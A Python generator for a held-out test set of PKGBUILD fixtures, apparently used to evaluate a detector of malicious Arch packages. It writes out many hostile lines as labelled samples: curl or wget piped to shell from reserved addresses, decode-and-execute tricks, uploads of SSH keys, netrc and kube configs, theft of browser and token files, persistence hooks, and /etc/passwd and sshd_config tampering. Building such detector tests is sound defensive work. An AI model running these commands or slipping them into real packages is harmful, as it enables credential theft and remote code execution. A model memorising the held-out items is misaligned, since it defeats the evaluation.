# SPDX-License-Identifier: GPL-2.0-or-later
# Fourth held-out set, written after the fourth freeze (c4eff09). The seed picks 40 of this pool. Never tuned on.
import os,sys,base64,hashlib
fix=sys.argv[1]
seed=open(fix+'/holdout4.seed').readline().strip()
H='# Inert test fixture: nothing here is ever run, and every address is reserved or fake.\npkgname=%s\npkgver=1.0\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nlicense=(MIT)\nsource=(%s)\nsha256sums=(%s)\n'
SUM='0'*64
OK='https://example.org/demo.tar.gz'
IN=base64.b64encode(b'echo inert\n').decode()
T='.build/demo/src/demo-1.0/'
A='http://198.51.100.%d/y'
F={}
def fx(name,expect,body='',files=None,src=OK,suffix=''):
    F[name]=(expect,H%(name+suffix,src,SUM)+body,files or {})
B=lambda s:'build() {\n  %s\n}\n'%s
P=lambda s:'package() {\n  %s\n}\n'%s
def I(name,expect,s):
    fx(name,expect,'install=demo.install\n',{'demo.install':'post_install() {\n  %s\n}\n'%s})
FE='fetch_execute_unverified'; DE='decode_execute'; CN='credential_to_network'; RC='read_credentials'
UP='undeclared_persistence'; SU='scriptlet_undeclared_file'; SO='source_off_upstream'; UD='unresolved_dynamic'; BC='bin_checksum_upstream'; PN='postinstall_network'
fx('curl-output-dir',FE,B('curl -s -o /tmp/y %s\n  bash /tmp/y'%(A%51)))
fx('wget-then-source',FE,B('wget -q -O y.sh %s\n  source y.sh'%(A%52)))
fx('curl-process-sub',FE,B('bash <(curl -s %s)'%(A%53)))
fx('curl-cmd-sub',FE,B('sh -c "$(curl -fsSL %s)"'%(A%54)))
fx('curl-dot',FE,B('. <(curl -s %s)'%(A%55)))
fx('python-urllib-exec',FE,B('python3 g.py'),{'g.py':'import urllib.request\nexec(urllib.request.urlopen("%s").read())\n'%(A%56)})
fx('python-c-pipe',FE,B('''python3 -c 'import urllib.request as u;exec(u.urlopen("%s").read())' '''%(A%57)))
fx('perl-lwp',FE,B('''perl -MLWP::Simple -e 'eval get("%s")' '''%(A%58)))
fx('ftp-fetch-run',FE,B('ftp -o y %s\n  chmod 755 y\n  ./y'%(A%59)))
fx('scp-run',FE,B('scp mirror@198.51.100.60:y .\n  sh y'))
fx('rsync-run',FE,B('rsync rsync://198.51.100.61/y y\n  sh y'))
fx('nc-pipe-sh',FE,B('nc 198.51.100.62 80 | sh'))
fx('tee-pipe',FE,B('curl -s %s | tee y | sh'%(A%63)))
fx('make-all-curl',FE,B('make'),{T+'Makefile':'all:\n\tcurl -s %s | sh\n'%(A%64)})
fx('make-prereq-curl',FE,B('make'),{T+'Makefile':'all: gen\n\tcc x.c\ngen:\n\twget -qO- %s | sh\n'%(A%65)})
fx('make-var-target',FE,'_t=boot\n'+B('make $_t'),{T+'Makefile':'boot:\n\tcurl -s %s | sh\n'%(A%66)})
fx('make-shell-fn',FE,B('make'),{T+'Makefile':'X := $(shell curl -s %s | sh)\nall:\n\tcc x.c\n'%(A%67)})
fx('make-recursive',FE,B('make'),{T+'Makefile':'all:\n\t$(MAKE) stage2\nstage2:\n\tcurl -s %s | sh\n'%(A%68)})
fx('meson-custom',FE,B('meson setup b'),{T+'meson.build':"run_command('sh','-c','curl -s %s | sh')\n"%(A%69)})
fx('setup-subprocess',FE,'',{T+'setup.py':'import subprocess\nsubprocess.call("curl -s %s | sh",shell=True)\n'%(A%70)})
fx('npm-postinstall',FE,B('npm install'),{T+'package.json':'{"scripts":{"postinstall":"wget -qO- %s | sh"}}\n'%(A%71)})
fx('base64-w0',DE,B('base64 --decode <<< %s | bash'%IN))
fx('python-b64-exec',DE,B('python3 d.py'),{'d.py':'import base64\nexec(base64.b64decode("%s"))\n'%IN})
fx('tr-rot13',DE,B("echo 'rpub vaneg' | tr a-z n-za-m | sh"))
fx('zcat-sh',DE,B('zcat p.gz | bash'))
fx('awk-print-sh',DE,B("awk 'NR>1' blob | sh"))
fx('tail-self',DE,B('tail -n +3 blob | sh'))
fx('eval-base64',DE,B('eval "$(echo %s | base64 -d)"'%IN))
fx('hex-printf-sh',DE,B(r"printf '\x65\x63\x68\x6f' | bash"))
fx('netrc-post',CN,B('curl -T ~/.netrc %s'%(A%80)))
fx('kube-config',CN,B('curl --data-binary @$HOME/.kube/config %s'%(A%81)))
fx('wget-post-file',CN,B('wget --post-file=$HOME/.ssh/id_rsa %s'%(A%82)))
fx('ff-logins',RC,B('cp ~/.mozilla/firefox/*/logins.json /tmp/z'))
fx('docker-config',RC,B('cat ~/.docker/config.json > /tmp/z'))
fx('npmrc-read',RC,B('grep token ~/.npmrc > /tmp/z'))
fx('profile-append',UP,B("echo 'y' >> ~/.profile"))
fx('zshrc-append',UP,B("echo 'y' >> ~/.zshrc"))
fx('autostart-user',UP,B('cp y.desktop ~/.config/autostart/y.desktop'))
fx('crontab-pipe',UP,B('echo "* * * * * y" | crontab -'))
I('timer-enable',UP,'systemctl enable --now stranger.timer')
I('profile-d',UP,"echo 'y' > /etc/profile.d/y.sh")
I('passwd-edit',SU,"echo 'y::0:0::/:/bin/sh' >> /etc/passwd")
I('hosts-edit',SU,"echo '198.51.100.90 update.example.org' >> /etc/hosts")
I('ssh-config',SU,"sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config")
I('curl-in-install',PN,'curl -s %s -o /dev/null'%(A%91))
fx('ipv6-source',SO,src='http://[2001:db8::1]/demo.tar.gz')
fx('gitlab-stranger',SO,src='https://gitlab.com/example-stranger/demo/-/archive/1.0/demo.tar.gz')
fx('pastebin-source',SO,src='https://paste.example.net/raw/demo.tar.gz')
fx('deb-no-sum',BC,P('bsdtar -xf a.deb'),src='https://example.org/a.deb',suffix='-bin')
F['deb-no-sum']=(BC,F['deb-no-sum'][1].replace('0'*64,'SKIP'),{})
fx('computed-url',UD,B('u=$(cat addr)\n  c=$(cat cmd)\n  $c $u'))
fx('eval-var',UD,B('eval "$(cat script.txt)$SUFFIX"'))
order=sorted(F,key=lambda n:hashlib.sha256(f'{seed}:{n}'.encode()).hexdigest())
print(len(F),'pool')
root=fix+'/holdout4'
for n in order[:40]:
    e,p,fs=F[n]
    d=f'{root}/{n}'; os.makedirs(d,exist_ok=True)
    open(d+'/EXPECT','w',newline='\n').write(e+'\n'); open(d+'/PKGBUILD','w',newline='\n').write(p)
    for k,v in fs.items():
        q=f'{d}/{k}'; os.makedirs(os.path.dirname(q),exist_ok=True); open(q,'w',newline='\n').write(v)
print('left out',sorted(order[40:]))
